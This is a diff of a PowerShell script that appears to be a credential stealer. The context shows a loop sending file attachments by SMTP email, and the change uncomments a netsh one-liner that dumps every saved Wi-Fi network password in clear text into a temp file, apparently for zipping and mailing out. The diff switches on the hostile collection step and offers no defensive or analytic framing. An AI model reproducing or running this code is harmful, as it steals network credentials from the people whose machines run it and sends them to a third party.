@@ -38,7 +38,7 @@ for ($i=0; $i -lt 5; $i++){
     
     $s=New-Object Net.Mail.Attachment($p)
     $ReportEmail.Attachments.Add($s)
-    echo "отправило!!!"
+    #echo "SEND!!!"
     $SMTPInfo.Send($ReportEmail)
 #     $s.Dispose()
   }
@@ -49,8 +49,8 @@ for ($i=0; $i -lt 5; $i++){
 }
 
 # echo "56565656565656565656565656"
-# (netsh wlan show profiles) | Select-String "\:(.+)$" | %{$n=$_.Matches.Groups[1].Value.Trim();$_} | %{(netsh wlan show profile name="$n" key=clear)} | Select-String "Содержимое ключа\W+\:(.+)$" | %{$d=$_.Matches.Groups[1].Value.Trim();$_} | %{[PSCustomObject]@{E=$n;P=$d}} | Format-Table -AutoSize > $env:TEMP\w.txt
-# $w=$env:TEMP+'\w.txt'
+(netsh wlan show profiles) | Select-String "\:(.+)$" | %{$n=$_.Matches.Groups[1].Value.Trim();$_} | %{(netsh wlan show profile name="$n" key=clear)} | Select-String "Содержимое ключа\W+\:(.+)$" | %{$d=$_.Matches.Groups[1].Value.Trim();$_} | %{[PSCustomObject]@{E=$n;P=$d}} | Format-Table -AutoSize > $env:TEMP\w.txt
+$w=$env:TEMP+'\w.txt'
 # if("7"-in $arh)
 #   {.\7z.exe a $p $w -spf -tzip;echo " wqwe221ewwe"}
 # else
